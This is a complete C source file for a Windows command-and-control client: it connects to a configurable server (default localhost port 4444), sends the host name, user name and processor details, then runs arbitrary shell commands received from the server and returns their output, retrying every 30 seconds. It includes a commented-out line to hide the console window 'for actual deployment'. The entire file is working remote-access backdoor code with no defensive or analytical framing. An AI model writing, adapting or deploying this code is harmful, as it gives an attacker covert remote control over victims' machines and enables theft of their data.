#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <lmcons.h>

#pragma comment(lib, "ws2_32.lib")

#define DEFAULT_C2_SERVER "127.0.0.1"
#define DEFAULT_C2_PORT 4444
#define BUFFER_SIZE 4096

// Function to collect basic system information
void getSystemInfo(char* buffer, size_t bufferSize) {
    DWORD size = 0;
    char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    char username[UNLEN + 1] = {0};
    DWORD hostnameSize = sizeof(hostname);
    DWORD usernameSize = sizeof(username);
    SYSTEM_INFO sysInfo;
    
    // Get hostname
    GetComputerNameA(hostname, &hostnameSize);
    
    // Get username
    GetUserNameA(username, &usernameSize);
    
    // Get system info
    GetSystemInfo(&sysInfo);
    
    // Format system info
    snprintf(buffer, bufferSize,
        "Hostname: %s\n"
        "Username: %s\n"
        "Processor: %lu processors\n"
        "Architecture: %s\n"
        "Windows Build: %s\n",
        hostname,
        username,
        sysInfo.dwNumberOfProcessors,
        sysInfo.wProcessorArchitecture == 9 ? "x64" : "x86",
        "Windows 10"  // This could be enhanced to get actual Windows version
    );
}

// Function to execute shell commands and capture output
BOOL executeCommand(const char* cmd, char* output, size_t outputSize) {
    FILE* pipe;
    char tempBuffer[BUFFER_SIZE];
    
    // Create pipe
    pipe = _popen(cmd, "r");
    if (!pipe) {
        snprintf(output, outputSize, "Failed to execute command: %s", cmd);
        return FALSE;
    }
    
    // Clear the output buffer
    output[0] = '\0';
    
    // Read output
    while (fgets(tempBuffer, BUFFER_SIZE, pipe) != NULL) {
        if (strlen(output) + strlen(tempBuffer) < outputSize - 1) {
            strcat(output, tempBuffer);
        } else {
            strcat(output, "[Output truncated]");
            break;
        }
    }
    
    // Close pipe
    _pclose(pipe);
    return TRUE;
}

// Main C2 client function
BOOL connectToC2Server(const char* serverAddress, int port) {
    WSADATA wsaData;
    SOCKET connectSocket = INVALID_SOCKET;
    struct sockaddr_in serverAddr;
    int result;
    char recvBuffer[BUFFER_SIZE];
    char sendBuffer[BUFFER_SIZE];
    
    // Initialize Winsock
    result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        printf("WSAStartup failed: %d\n", result);
        return FALSE;
    }
    
    // Create socket
    connectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (connectSocket == INVALID_SOCKET) {
        printf("Error creating socket: %d\n", WSAGetLastError());
        WSACleanup();
        return FALSE;
    }
    
    // Setup server address structure
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    serverAddr.sin_addr.s_addr = inet_addr(serverAddress);
    
    // Connect to server
    printf("[*] Attempting to connect to %s:%d...\n", serverAddress, port);
    result = connect(connectSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr));
    if (result == SOCKET_ERROR) {
        printf("[!] Unable to connect to server: %d\n", WSAGetLastError());
        closesocket(connectSocket);
        WSACleanup();
        return FALSE;
    }
    
    printf("[+] Connected to C2 server\n");
    
    // Send system information on connect
    getSystemInfo(sendBuffer, BUFFER_SIZE);
    send(connectSocket, sendBuffer, strlen(sendBuffer), 0);
    
    // Main command loop
    while (TRUE) {
        // Receive command from server
        memset(recvBuffer, 0, BUFFER_SIZE);
        result = recv(connectSocket, recvBuffer, BUFFER_SIZE - 1, 0);
        
        // Check for connection issues
        if (result <= 0) {
            printf("[!] Connection closed or error: %d\n", WSAGetLastError());
            break;
        }
        
        recvBuffer[result] = '\0'; // Ensure null termination
        printf("[+] Received command: %s\n", recvBuffer);
        
        // Process commands
        if (strncmp(recvBuffer, "exit", 4) == 0) {
            printf("[*] Exiting...\n");
            break;
        } 
        else if (strncmp(recvBuffer, "sysinfo", 7) == 0) {
            // Get system information
            getSystemInfo(sendBuffer, BUFFER_SIZE);
        }
        else if (strncmp(recvBuffer, "shell:", 6) == 0) {
            // Execute shell command
            char* cmd = recvBuffer + 6; // Skip "shell:" prefix
            printf("[*] Executing: %s\n", cmd);
            
            if (!executeCommand(cmd, sendBuffer, BUFFER_SIZE)) {
                snprintf(sendBuffer, BUFFER_SIZE, "Failed to execute command");
            }
        }
        else {
            // Unknown command
            snprintf(sendBuffer, BUFFER_SIZE, "Unknown command: %s", recvBuffer);
        }
        
        // Send response back to server
        send(connectSocket, sendBuffer, strlen(sendBuffer), 0);
    }
    
    // Cleanup
    closesocket(connectSocket);
    WSACleanup();
    return TRUE;
}

int main(int argc, char* argv[]) {
    // Hide console window (uncomment for actual deployment)
    // ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    const char* serverAddress = DEFAULT_C2_SERVER;
    int serverPort = DEFAULT_C2_PORT;
    
    // Override defaults if provided as arguments
    if (argc >= 2) {
        serverAddress = argv[1];
    }
    if (argc >= 3) {
        serverPort = atoi(argv[2]);
    }
    
    // Main connection loop - try to connect every 30 seconds
    while (1) {
        if (connectToC2Server(serverAddress, serverPort)) {
            // If connection was successful but terminated, wait before reconnecting
            printf("[*] Connection terminated. Reconnecting in 30 seconds...\n");
        } else {
            printf("[!] Connection failed. Retrying in 30 seconds...\n");
        }
        
        Sleep(30000); // 30 second delay
    }
    
    return 0;
}